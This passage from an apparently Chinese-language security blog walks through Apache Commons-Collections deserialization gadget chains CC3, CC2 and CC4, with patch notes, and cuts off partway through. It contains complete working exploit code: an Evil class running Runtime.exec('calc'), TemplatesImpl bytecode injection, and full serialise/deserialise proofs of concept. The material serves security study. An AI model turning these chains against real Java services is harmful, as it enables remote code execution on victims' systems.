class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.29.2-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>Evil.class</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span><br>            <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>demo</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>    field.setAccessible(<span class="hljs-literal">true</span>);<br>    field.set(obj, newValue);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; obj &#125;)<br>    &#125;;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">argMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">evilMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(argMap, <span class="hljs-literal">null</span>, chainedTransformer);<br>    evilMap.put(<span class="hljs-string">&quot;xxx&quot;</span>, <span class="hljs-string">&quot;yyy&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>把CC6改造一下，就得到了CC3：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; obj &#125;)<br>        &#125;;<br>        <br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728215703672.png" alt="image-20240728215703672"></p><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><p>前面就提到，Commons-Collection有俩官方的包：</p><ul><li>commons-collections:commons-collections</li><li>org.apache.commons:commons-collections4</li></ul><p>两者的命名空间不冲突，也就是可以共存在同⼀个项目中。</p><p>使用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>之前我们研究的利用链<code>CC1、CC6、CC3</code>在<code>commons-collections4</code>均能正常使用，不过方法名可能稍有变动，其实就是<code>Lazymap</code>处decorate没了：</p><p>原decorate:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个⽅法不过就是<code>LazyMap</code>构造函数的⼀个包装，⽽在4中其实只是改了个名字叫<code>lazymap</code>。</p><p>4中的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;V, K&gt; LazyMap&lt;K, V&gt; <span class="hljs-title function_">lazyMap</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map&lt;K, V&gt; map, <span class="hljs-keyword">final</span> </span><br><span class="hljs-params">Transformer&lt;? <span class="hljs-built_in">super</span> K, ? extends V&gt; factory)</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>&lt;K,V&gt;(map, factory);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们将Gadget中出错的代码换⼀下名字：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.lazyMap(innerMap, transformerChain);<br></code></pre></td></tr></table></figure><p>然后弹calc是一样的。</p><p>由此可得，CC链实际上就是一条<code>Serializable#readObject()</code>到<code>Transformer#transform()</code>的调用链。</p><p>要看CC2，那么这里就需要引入两个新类：</p><ul><li><code>java.util.PriorityQueue</code></li><li><code>org.apache.commons.collections4.comparators.TransformingComparator</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PriorityQueue</span>&lt;E&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueue</span>&lt;E&gt;<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>&#123;<br>            s.defaultReadObject();<br>            s.readInt();<br>            queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[size];<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++)<br>                queue[i] = s.readObject();<br>            heapify();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>            siftDown(i, (E) queue[i]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// TransformingComparator#compare</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(<span class="hljs-keyword">final</span> I obj1, <span class="hljs-keyword">final</span> I obj2)</span> &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">O</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj1);<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">O</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj2);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.decorated.compare(value1, value2);<br>&#125;<br></code></pre></td></tr></table></figure><p>Gadget chains：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">PriorityQueue#readObject() =&gt; <br>heapify() =&gt; <br>siftDown() =&gt; <br>siftDownUsingComparator() =&gt; <br>comparator.compare() =&gt; <br>transformer.transform()<br></code></pre></td></tr></table></figure><ul><li><code>heapify</code> <code>int i = (size &gt;&gt;&gt; 1) - 1</code>需要非负</li><li><code>siftDownUsingComparator</code> <code>half = size &gt;&gt;&gt; 1</code>需要大于上面的i</li></ul><p>而且<code>PriorityQueue</code>构造函数不会给size赋初值，需要用反射去赋值。</p><h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">pq</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(comparator);<br>        setFieldValue(pq, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">4</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(pq);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728222834295.png" alt="image-20240728222834295"></p><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p><code>org.apache.commons.collections4.comparators.TransformingComparator</code>在<code>commons-collections4.0</code>以前是版本没有实现<code>Serializable</code>接口</p><p>官方发布的新版本4.1和3.2.2用于修复CC链3.2.2中增加了⼀个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">FunctorUtils#checkUnsafeSerialization`<br></code></pre></td></tr></table></figure><p>它用于检测反序列化是否安全，其会检查常⻅的危险Transformer类，当我们反序列化包含这些对象时就会抛出异常。 若开发者没有设置全局配置 <code>org.apache.commons.collections.enableUnsafeSerialization=true</code> 即默认情况下会抛出异常</p><p>4.1中这几个危险的<code>Transformer</code>类不再实现<code>Serializable</code>接口，直接不能序列化和反序列化。</p><p><strong>因此CC2只能在<code>commons-collections4.0</code>上跑通。</strong></p><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>CC4跟CC2很接近。都是在Commons-Collections4的基础上的CC链。</p><p>而本质其实CC4就是用<code>InstantiateTransformer</code>代替了CC2的<code>InvokerTransformer</code>，借用一下<code>ysoserial</code>的代码,其实就是<code>CommonsCollections2</code>的<code>TemplatesImpl</code>变体，把CC2和CC3拼接一下，就得到了CC4：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 